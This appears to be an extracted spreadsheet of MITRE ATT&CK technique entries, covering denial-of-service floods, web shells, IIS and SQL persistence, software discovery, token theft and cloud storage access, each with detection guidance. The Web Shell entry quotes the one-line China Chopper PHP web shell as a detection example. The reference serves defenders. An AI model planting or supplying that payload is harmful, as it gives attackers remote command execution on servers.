    <t>Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.</t>
  </si>
  <si>
    <t>T1498.002</t>
  </si>
  <si>
    <t>Reflection Amplification (T1498.002)</t>
  </si>
  <si>
    <t>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 system may be used to conduct the attack, or a botnet may be used. Likewise, one or more reflectors may be used to focus traffic on the target.(Citation: Cloudflare ReflectionDoS May 2017) This Network DoS attack may also reduce the availability and functionality of the targeted system(s) and network.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 produce the amplification in attack volume. Two prominent protocols that have enabled Reflection Amplification Floods are DNS(Citation: Cloudflare DNSamplficationDoS) and NTP(Citation: Cloudflare NTPamplifciationDoS), though the use of several others in the wild have been documented.(Citation: Arbor AnnualDoSreport Jan 2018)  In particular, the memcache protocol showed itself to be a powerful protocol, with amplification sizes up to 51,200 times the requesting packet.(Citation: Cloudflare Memcrashed Feb 2018)</t>
  </si>
  <si>
    <t>Detection of reflection amplification can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow(Citation: Cisco DoSdetectNetflow), SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a reflection amplification DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.</t>
  </si>
  <si>
    <t>T1499</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)
An Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).
To perform DoS attacks against endpoint resources,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Botnets are commonly used to conduct DDoS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DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)
In cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)
For attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).
</t>
  </si>
  <si>
    <t>Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.
In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.
Externally monitor the availability of services that may be targeted by an Endpoint DoS.</t>
  </si>
  <si>
    <t>T1499.001</t>
  </si>
  <si>
    <t>OS Exhaustion Flood (T1499.001)</t>
  </si>
  <si>
    <t>Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.
Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)
ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)</t>
  </si>
  <si>
    <t>Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.</t>
  </si>
  <si>
    <t>T1499.002</t>
  </si>
  <si>
    <t>Service Exhaustion Flood (T1499.002)</t>
  </si>
  <si>
    <t>Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.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Another variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)</t>
  </si>
  <si>
    <t>T1499.003</t>
  </si>
  <si>
    <t>Application Exhaustion Flood (T1499.003)</t>
  </si>
  <si>
    <t>Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)</t>
  </si>
  <si>
    <t>Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.
In addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.</t>
  </si>
  <si>
    <t>T1499.004</t>
  </si>
  <si>
    <t>Application or System Exploitation (T1499.004)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.
Adversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. </t>
  </si>
  <si>
    <t>Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.</t>
  </si>
  <si>
    <t>T1505</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.(Citation: volexity_0day_sophos_FW)</t>
  </si>
  <si>
    <t xml:space="preserve">Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.
Process monitoring may be used to detect servers components that perform suspicious actions such as running cmd.exe or accessing files. Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells) </t>
  </si>
  <si>
    <t>T1505.001</t>
  </si>
  <si>
    <t>SQL Stored Procedures (T1505.001)</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).
Adversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019) To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.(Citation: NetSPI Startup Stored Procedures)(Citation: Kaspersky MSSQL Aug 2019)(Citation: Microsoft xp_cmdshell 2017) 
Microsoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).(Citation: Microsoft CLR Integration 2017) Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.(Citation: NetSPI SQL Server CLR) </t>
  </si>
  <si>
    <t>On a MSSQL Server, consider monitoring for xp_cmdshell usage.(Citation: NetSPI Startup Stored Procedures) Consider enabling audit features that can log malicious startup activities.</t>
  </si>
  <si>
    <t>T1505.002</t>
  </si>
  <si>
    <t>Transport Agent (T1505.002)</t>
  </si>
  <si>
    <t>Application Log: Application Log Content, File: File Creation</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may abuse Microsoft transport agents to establish persistent access to systems. Microsoft Exchange transport agents can operate on email messages passing through the transport pipeline to perform various tasks such as filtering spam, filtering malicious attachments, journaling, or adding a corporate signature to the end of all outgoing emails.(Citation: Microsoft TransportAgent Jun 2016)(Citation: ESET LightNeuron May 2019) Transport agents can be written by application developers and then compiled to .NET assemblies that are subsequently registered with the Exchange server. Transport agents will be invoked during a specified stage of email processing and carry out developer defined tasks. 
Adversaries may register a malicious transport agent to provide a persistence mechanism in Exchange Server that can be triggered by adversary-specified email events.(Citation: ESET LightNeuron May 2019) Though a malicious transport agent may be invoked for all emails passing through the Exchange transport pipeline, the agent can be configured to only carry out specific tasks in response to adversary defined criteria. For example, the transport agent may only carry out an action like copying in-transit attachments and saving them for later exfiltration if the recipient email address matches an entry on a list provided by the adversary. </t>
  </si>
  <si>
    <t>Consider monitoring application logs for abnormal behavior that may indicate suspicious installation of application software components. Consider monitoring file locations associated with the installation of new application software components such as paths from which applications typically load such extensible components.</t>
  </si>
  <si>
    <t>T1505.003</t>
  </si>
  <si>
    <t>Web Shell (T1505.003)</t>
  </si>
  <si>
    <t>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execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)
In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013)</t>
  </si>
  <si>
    <t>Web shells can be difficult to detect. Unlike other forms of persistent remote access, they do not initiate connections. The portion of the Web shell that is on the server may be small and innocuous looking. The PHP version of the China Chopper Web shell, for example, is the following short payload: (Citation: Lee 2013) 
&lt;code&gt;&amp;lt;?php @eval($_POST['password']);&amp;gt;&lt;/code&gt;
Nevertheless, detection mechanisms exist. Process monitoring may be used to detect Web servers that perform suspicious actions such as spawning cmd.exe or accessing files that are not in the Web directory.(Citation: NSA Cyber Mitigating Web Shells)
File monitoring may be used to detect changes to files in the Web directory of a Web server that do not match with updates to the Web server's content and may indicate implantation of a Web shell script.(Citation: NSA Cyber Mitigating Web Shells)
Log authentication attempts to the server and any unusual traffic patterns to or from the server and internal network. (Citation: US-CERT Alert TA15-314A Web Shells)</t>
  </si>
  <si>
    <t>T1505.004</t>
  </si>
  <si>
    <t>IIS Components (T1505.004)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification</t>
  </si>
  <si>
    <t>Adversaries may install malicious components that run on Internet Information Services (IIS) web servers to establish persistence. IIS provides several mechanisms to extend the functionality of the web servers. For example, Internet Server Application Programming Interface (ISAPI) extensions and filters can be installed to examine and/or modify incoming and outgoing IIS web requests. Extensions and filters are deployed as DLL files that export three functions: &lt;code&gt;Get{Extension/Filter}Version&lt;/code&gt;, &lt;code&gt;Http{Extension/Filter}Proc&lt;/code&gt;, and (optionally) &lt;code&gt;Terminate{Extension/Filter}&lt;/code&gt;. IIS modules may also be installed to extend IIS web servers.(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: IIS Backdoor 2011)(Citation: Trustwave IIS Module 2013)
Adversaries may install malicious ISAPI extensions and filters to observe and/or modify traffic, execute commands on compromised machines, or proxy command and control traffic. ISAPI extensions and filters may have access to all IIS web requests and responses. For example, an adversary may abuse these mechanisms to modify HTTP responses in order to distribute malicious commands/content to previously comprised hosts.(Citation: Microsoft ISAPI Filter Overview 2017)(Citation: Microsoft ISAPI Extension Overview 2017)(Citation: Microsoft ISAPI Extension All Incoming 2017)(Citation: Dell TG-3390)(Citation: Trustwave IIS Module 2013)(Citation: MMPC ISAPI Filter 2012)
Adversaries may also install malicious IIS modules to observe and/or modify traffic. IIS 7.0 introduced modules that provide the same unrestricted access to HTTP requests and responses as ISAPI extensions and filters. IIS modules can be written as a DLL that exports &lt;code&gt;RegisterModule&lt;/code&gt;, or as a .NET application that interfaces with ASP.NET APIs to access IIS HTTP requests.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Trustwave IIS Module 2013)(Citation: ESET IIS Malware 2021)</t>
  </si>
  <si>
    <t>Monitor for creation and/or modification of files (especially DLLs on webservers) that could be abused as malicious ISAPI extensions/filters or IIS modules. Changes to &lt;code&gt;%windir%\system32\inetsrv\config\applicationhost.config&lt;/code&gt; could indicate an IIS module installation.(Citation: Microsoft IIS Modules Overview 2007)(Citation: ESET IIS Malware 2021)
Monitor execution and command-line arguments of &lt;code&gt;AppCmd.exe&lt;/code&gt;, which may be abused to install malicious IIS modules.(Citation: Microsoft IIS Modules Overview 2007)(Citation: Unit 42 RGDoor Jan 2018)(Citation: ESET IIS Malware 2021)</t>
  </si>
  <si>
    <t>T1505.005</t>
  </si>
  <si>
    <t>Terminal Services DLL (T1505.005)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)
[Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a "generic" process (ex: &lt;code&gt;svchost.exe&lt;/code&gt;) load the service's DLL file, the location of which is stored in a Registry entry named &lt;code&gt;ServiceDll&lt;/code&gt;.(Citation: Microsoft System Services Fundamentals) The &lt;code&gt;termsrv.dll&lt;/code&gt; file, typically stored in `%SystemRoot%\System32\`, is the default &lt;code&gt;ServiceDll&lt;/code&gt; value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.
Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal &lt;code&gt;termsrv.dll&lt;/code&gt; functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the &lt;code&gt;termsrv.dll&lt;/code&gt; file or modifying the &lt;code&gt;ServiceDll&lt;/code&gt; value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.</t>
  </si>
  <si>
    <t>Monitor for changes to Registry keys associated with &lt;code&gt;ServiceDll&lt;/code&gt; and other subkey values under &lt;code&gt;HKLM\System\CurrentControlSet\services\TermService\Parameters\&lt;/code&gt;.
Monitor unexpected changes and/or interactions with &lt;code&gt;termsrv.dll&lt;/code&gt;, which is typically stored in &lt;code&gt;%SystemRoot%\System32\&lt;/code&gt;.
Monitor commands as well as  processes and arguments for potential adversary actions to modify Registry values (ex: &lt;code&gt;reg.exe&lt;/code&gt;) or modify/replace the legitimate &lt;code&gt;termsrv.dll&lt;/code&gt;.
Monitor module loads by the Terminal Services process (ex: &lt;code&gt;svchost.exe -k termsvcs&lt;/code&gt;) for unexpected DLLs (the default is &lt;code&gt;%SystemRoot%\System32\termsrv.dll&lt;/code&gt;, though an adversary could also use [Match Legitimate Name or Location](https://attack.mitre.org/techniques/T1036/005) on a malicious payload).</t>
  </si>
  <si>
    <t>T1518</t>
  </si>
  <si>
    <t>Command: Command Execution, Firewall: Firewall Enumeration, Firewall: Firewall Metadata, Process: OS API Execution, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from [Software Discovery](https://attack.mitre.org/techniques/T1518) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
Such software may be deployed widely across the environment for configuration management or security reasons, such as [Software Deployment Tools](https://attack.mitre.org/techniques/T1072), and may allow adversaries broad access to infect devices or move laterally.
Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).</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</si>
  <si>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</si>
  <si>
    <t>T1518.001</t>
  </si>
  <si>
    <t>Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.
Example commands that can be used to obtain security software information are [netsh](https://attack.mitre.org/software/S0108), &lt;code&gt;reg query&lt;/code&gt; with [Reg](https://attack.mitre.org/software/S0075), &lt;code&gt;dir&lt;/code&gt; with [cmd](https://attack.mitre.org/software/S0106), and [Tasklist](https://attack.mitre.org/software/S0057), but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.
Adversaries may also utilize the [Cloud API](https://attack.mitre.org/techniques/T1059/009) to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.</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</si>
  <si>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In cloud environments, additionally monitor logs for the usage of APIs that may be used to gather information about security software configurations within the environment.</t>
  </si>
  <si>
    <t>T1525</t>
  </si>
  <si>
    <t>Image: Image Creation, Image: Image Metadata, Image: Image Modification</t>
  </si>
  <si>
    <t>Adversaries may implant cloud or container images with malicious code to establish persistence after gaining access to an environment. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images, and Azure Images as well as popular container runtimes such as Docker can be implanted or backdoored. Unlike [Upload Malware](https://attack.mitre.org/techniques/T1608/001), this technique focuses on adversaries implanting an image in a registry within a victim’s environment. Depending on how the infrastructure is provisioned, this could provide persistent access if the infrastructure provisioning tool is instructed to always use the latest image.(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)
A tool has been developed to facilitate planting backdoors in cloud container images.(Citation: Rhino Labs Cloud Backdoor September 2019) If an adversary has access to a compromised AWS instance, and permissions to list the available container images, they may implant a backdoor such as a [Web Shell](https://attack.mitre.org/techniques/T1505/003).(Citation: Rhino Labs Cloud Image Backdoor Technique Sept 2019)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor interactions with images and containers by users to identify ones that are added or modified anomalously.
In containerized environments, changes may be detectable by monitoring the Docker daemon logs or setting up and monitoring Kubernetes audit logs depending on registry configuration. </t>
  </si>
  <si>
    <t>T1526</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Enumeration, Logon Session: Logon Session Creation</t>
  </si>
  <si>
    <t>An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Entra ID, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.
Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Microsoft Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.(Citation: Azure - Resource Manager API)(Citation: Azure AD Graph API)
For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.(Citation: Azure - Stormspotter)(Citation: GitHub Pacu)
Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001) or [Disable or Modify Cloud Logs](https://attack.mitre.org/techniques/T1562/008).</t>
  </si>
  <si>
    <t>Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.
Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.</t>
  </si>
  <si>
    <t>T1528</t>
  </si>
  <si>
    <t>Active Directory: Active Directory Object Modification, User Account: User Account Modification</t>
  </si>
  <si>
    <t>Containers, IaaS, Identity Provider, Office Suite, SaaS</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries can steal application access tokens as a means of acquiring credentials to access remote systems and resources.
Application access tokens are used to make authorized API requests on behalf of a user or service and are commonly used as a way to access resources in cloud and container-based applications and software-as-a-service (SaaS).(Citation: Auth0 - Why You Should Always Use Access Tokens to Secure APIs Sept 2019)  Adversaries who steal account API tokens in cloud and containerized environments may be able to access data and perform actions with the permissions of these accounts, which can lead to privilege escalation and further compromise of the environment.
For example, in Kubernetes environments, processes running inside a container may communicate with the Kubernetes API server using service account tokens. If a container is compromised, an adversary may be able to steal the container’s token and thereby gain access to Kubernetes API commands.(Citation: Kubernetes Service Accounts)  Similarly, instances within continuous-development / continuous-integration (CI/CD) pipelines will often use API tokens to authenticate to other services for testing and deployment.(Citation: Cider Security Top 10 CICD Security Risks) If these pipelines are compromised, adversaries may be able to steal these tokens and leverage their privileges.
Token theft can also occur through social engineering, in which case user action may be required to grant access. OAuth is one commonly implemented framework that issues tokens to users for access to systems. An application desiring access to cloud-based services or protected APIs can gain entry using OAuth 2.0 through a variety of authorization protocols. An example commonly-used sequence is Microsoft's Authorization Code Grant flow.(Citation: Microsoft Identity Platform Protocols May 2019)(Citation: Microsoft - OAuth Code Authorization flow - June 2019) An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested by the application without obtaining user credentials. 
Adversaries can leverage OAuth authorization by constructing a malicious application designed to be granted access to resources with the target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) The adversary will need to complete registration of their application with the authorization server, for example Microsoft Identity Platform using Azure Portal, the Visual Studio IDE, the command-line interface, PowerShell, or REST API calls.(Citation: Microsoft - Azure AD App Registration - May 2019) Then, they can send a [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) to the target user to entice them to grant access to the application. Once the OAuth access token is granted, the application can gain potentially long-term access to features of the user account through [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: Microsoft - Azure AD Identity Tokens - Aug 2019)
Application access tokens may function within a limited lifetime, limiting how long an adversary can utilize the stolen token. However, in some cases, adversaries can also steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing them to obtain new access tokens without prompting the user.  
</t>
  </si>
  <si>
    <t>Administrators should set up monitoring to trigger automatic alerts when policy criteria are met. For example, using a Cloud Access Security Broker (CASB), admins can create a “High severity app permissions” policy that generates alerts if apps request high severity permissions or send permissions requests for too many users.
Security analysts can hunt for malicious apps using the tools available in their CASB, identity provider, or resource provider (depending on platform.) For example, they can filter for apps that are authorized by a small number of users, apps requesting high risk permissions, permissions incongruous with the app’s purpose, or apps with old “Last authorized” fields. A specific app can be investigated using an activity log displaying activities the app has performed, although some activities may be mis-logged as being performed by the user. App stores can be useful resources to further investigate suspicious apps.
Administrators can set up a variety of logs and leverage audit tools to monitor actions that can be conducted as a result of OAuth 2.0 access. For instance, audit reports enable admins to identify privilege escalation actions such as role creations or policy modifications, which could be actions performed after initial access.</t>
  </si>
  <si>
    <t>T1529</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Sensor Health: Host Status</t>
  </si>
  <si>
    <t>Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. &lt;code&gt;reload&lt;/code&gt;).(Citation: Microsoft Shutdown Oct 2017)(Citation: alert_TA18_106A)
Shutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.
Adversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.(Citation: Talos Nyetya June 2017)(Citation: Talos Olympic Destroyer 2018)</t>
  </si>
  <si>
    <t>Use process monitoring to monitor the execution and command line parameters of binaries involved in shutting down or rebooting systems. Windows event logs may also designate activity associated with a shutdown/reboot, ex. Event ID 1074 and 6006. Unexpected or unauthorized commands from network cli on network devices may also be associated with shutdown/reboot, e.g. the &lt;code&gt;reload&lt;/code&gt; command.</t>
  </si>
  <si>
    <t>T1530</t>
  </si>
  <si>
    <t>Cloud Service: Cloud Service Metadata, Cloud Storage: Cloud Storage Access</t>
  </si>
  <si>
    <t>IaaS, Office Suite, SaaS</t>
  </si>
  <si>
    <t>Adversaries may access data from cloud storage.
Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. 
In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). 
Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.
This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)
Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.</t>
  </si>
  <si>
